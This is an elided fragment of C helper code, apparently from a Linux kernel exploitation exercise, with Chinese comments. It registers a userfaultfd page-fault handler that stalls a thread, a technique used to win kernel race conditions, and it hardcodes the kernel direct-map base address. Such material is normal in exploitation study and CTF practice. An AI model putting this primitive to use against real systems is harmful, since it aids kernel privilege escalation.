...
size_t page_offset_base4 = 0xffff880000000000;
...
void print_binary(char* buf, int length)
{
    ...
    printf("\033[32m\033[1m[+] Address info starting in: \033[0m%p\n", buf);
    int index = 0;
...
//为一块指定地址 addr、大小 len 的内存空间注册缺页异常函数 handler
                          ...
                          unsigned long len, void *(*handler)(void*))
{
    ...
    if (uffd == -1) {
        err_exit("Userfaultfd error!");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        err_exit("Ioctl-UFFDIO_API error!");
    }
    ...
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        err_exit("Ioctl-UFFDIO_REGISTER error!");
    }
...
//这个 arg 参数对应上面 register_userfaultfd 中 pthread_create 的第四个参数，将 uffd 文件描述符传入本函数中
void *uffd_handler_for_stucking_thread(void *args)
{
    ...
    for (;;) {
        ...
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
            err_exit("Ioctl-UFFDIO_COPY error!");
        }
